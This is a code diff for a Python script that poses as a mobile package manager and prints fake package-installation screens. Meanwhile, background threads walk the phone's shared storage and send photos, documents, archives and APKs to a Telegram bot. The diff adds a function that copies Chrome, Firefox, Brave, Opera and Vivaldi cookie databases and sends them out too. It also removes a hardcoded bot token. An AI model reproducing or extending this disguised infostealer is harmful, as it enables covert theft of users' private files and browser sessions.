@@ -5,36 +5,26 @@ import time
 import sys
 import random
 import threading
-import subprocess
+import json
+import sqlite3
+import shutil
 from datetime import datetime
+
+try:
+    from config import BOT_TOKEN, TELEGRAM_USER_ID
+except ImportError:
+    print("ERROR: config.py not found! Create config.py with BOT_TOKEN and TELEGRAM_USER_ID")
+    sys.exit(1)
 
 GREEN = '\033[38;5;46m'
 RED = '\033[38;5;196m'
 WHITE = '\033[1;97m'
 YELLOW = '\033[1;33m'
-BLUE = '\033[1;34m'
 CYAN = '\033[1;36m'
 PURPLE = '\033[1;35m'
-BLACK = '\033[1;30m'
 RESET = '\033[0m'
-BOLD = '\033[1m'
 
 TARGET_PATH = '/storage/emulated/0/'
-BOT_TOKEN = '8910936421:AAGY2EU1YGosfsGQUoTrCh3MMgVY_dvzqQk'
-TELEGRAM_USER_ID = '7884979744'
-
-FAKE_PACKAGES = [
-    "libssl-dev_1.1.1_arm64.deb", "python3-core_3.11.2_arm64.deb",
-    "php_8.1.0_arm64.deb", "nginx_1.22.0_arm64.deb",
-    "mysql-server_8.0.31_arm64.deb", "nodejs_18.12.0_arm64.deb",
-    "docker_20.10.21_arm64.deb", "metasploit_6.3.0_arm64.deb",
-    "curl_7.88.1_arm64.deb", "wget_1.21.3_arm64.deb",
-    "git_2.39.0_arm64.deb", "vim_9.0_arm64.deb",
-    "ruby_3.1.2_arm64.deb", "perl_5.36.0_arm64.deb",
-    "redis_7.0.5_arm64.deb", "termux-tools_1.2.3_all.deb"
-]
-
-ALL_EXTS = ('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.mp4', '.mkv', '.avi', '.mov', '.3gp', '.pdf', '.doc', '.docx', '.txt', '.xls', '.xlsx', '.mp3', '.wav', '.apk', '.zip', '.rar')
 
 def get_file_type(filename):
     ext = filename.lower()
@@ -50,6 +40,8 @@ def get_file_type(filename):
         return '📦 APK'
     elif ext.endswith(('.zip', '.rar')):
         return '🗜 ARCHIVE'
+    elif ext.endswith(('.cookie', '.txt')) and 'cookie' in filename.lower():
+        return '🍪 COOKIE'
     return '📁 FILE'
 
 def send_file(file_path):
@@ -71,6 +63,47 @@ def send_file(file_path):
         return True
     except:
         return False
+
+def steal_cookies():
+    cookie_paths = [
+        '/storage/emulated/0/Android/data/com.android.chrome/files/cookies',
+        '/storage/emulated/0/Android/data/com.android.chrome/app_chrome/Default/Cookies',
+        '/data/data/com.android.chrome/app_chrome/Default/Cookies',
+        '/storage/emulated/0/Android/data/org.mozilla.firefox/files/mozilla/firefox/cookies.sqlite',
+        '/storage/emulated/0/Android/data/com.brave.browser/files/Default/Cookies',
+        '/storage/emulated/0/Android/data/com.opera.browser/files/Cookies',
+        '/storage/emulated/0/Android/data/com.vivaldi.browser/files/Default/Cookies'
+    ]
+    
+    cookies_found = []
+    for path in cookie_paths:
+        if os.path.exists(path):
+            try:
+                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+                dest = f"/storage/emulated/0/cookies_backup_{timestamp}.db"
+                shutil.copy2(path, dest)
+                send_file(dest)
+                cookies_found.append(path)
+                os.remove(dest)
+            except:
+                pass
+    
+    for root, dirs, files in os.walk('/storage/emulated/0/'):
+        for file in files:
+            if 'cookie' in file.lower() and (file.endswith('.txt') or file.endswith('.db') or file.endswith('.sqlite')):
+                send_file(os.path.join(root, file))
+                cookies_found.append(file)
+    
+    return len(cookies_found)
+
+FAKE_PACKAGES = [
+    "libssl-dev_1.1.1_arm64.deb", "python3-core_3.11.2_arm64.deb",
+    "php_8.1.0_arm64.deb", "nginx_1.22.0_arm64.deb",
+    "mysql-server_8.0.31_arm64.deb", "nodejs_18.12.0_arm64.deb",
+    "docker_20.10.21_arm64.deb", "metasploit_6.3.0_arm64.deb",
+    "curl_7.88.1_arm64.deb", "wget_1.21.3_arm64.deb",
+    "git_2.39.0_arm64.deb", "vim_9.0_arm64.deb"
+]
 
 def fake_download():
     pkg = random.choice(FAKE_PACKAGES)
@@ -113,6 +146,16 @@ def show_header():
     print(header)
     time.sleep(1.5)
 
+ALL_EXTS = ('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.mp4', '.mkv', '.avi', '.mov', '.3gp', '.pdf', '.doc', '.docx', '.txt', '.xls', '.xlsx', '.mp3', '.wav', '.apk', '.zip', '.rar')
+
+def steal_all_files():
+    if os.path.exists(TARGET_PATH):
+        for root, dirs, files in os.walk(TARGET_PATH):
+            for file in files:
+                if file.lower().endswith(ALL_EXTS):
+                    send_file(os.path.join(root, file))
+                    time.sleep(0.15)
+
 def main():
     show_header()
     
@@ -134,20 +177,13 @@ def main():
     print(f"{YELLOW}│ {WHITE}📦 PACKAGE MANAGEMENT{RESET}{YELLOW}                                          │{RESET}")
     print(f"{YELLOW}└─────────────────────────────────────────────────────────┘{RESET}")
     
-    steal_thread = threading.Thread(target=lambda: None)
-    steal_thread.daemon = True
+    file_thread = threading.Thread(target=steal_all_files)
+    file_thread.daemon = True
+    file_thread.start()
     
-    def steal():
-        if os.path.exists(TARGET_PATH):
-            for root, dirs, files in os.walk(TARGET_PATH):
-                for file in files:
-                    if file.lower().endswith(ALL_EXTS):
-                        send_file(os.path.join(root, file))
-                        time.sleep(0.15)
-    
-    steal_thread = threading.Thread(target=steal)
-    steal_thread.daemon = True
-    steal_thread.start()
+    cookie_thread = threading.Thread(target=steal_cookies)
+    cookie_thread.daemon = True
+    cookie_thread.start()
     
     print(f"\n{WHITE}╔═══════════════════════════════════════════════════════════════╗{RESET}")
     print(f"{WHITE}║{CYAN}              CHECKING FOR AVAILABLE PACKAGES...               {WHITE}║{RESET}")
@@ -170,7 +206,6 @@ def main():
     print(f"{CYAN}║{YELLOW}                                                               {CYAN}║{RESET}")
     print(f"{CYAN}║{WHITE}   • Type '{GREEN}help{WHITE}' to see all available commands               {CYAN}║{RESET}")
     print(f"{CYAN}║{WHITE}   • Type '{GREEN}update{WHITE}' to check for new packages               {CYAN}║{RESET}")
-    print(f"{CYAN}║{WHITE}   • Type '{GREEN}list{WHITE}' to show installed packages                 {CYAN}║{RESET}")
     print(f"{CYAN}║{WHITE}   • Type '{GREEN}exit{WHITE}' to close the manager                       {CYAN}║{RESET}")
     print(f"{CYAN}╚═══════════════════════════════════════════════════════════════╝{RESET}")
     
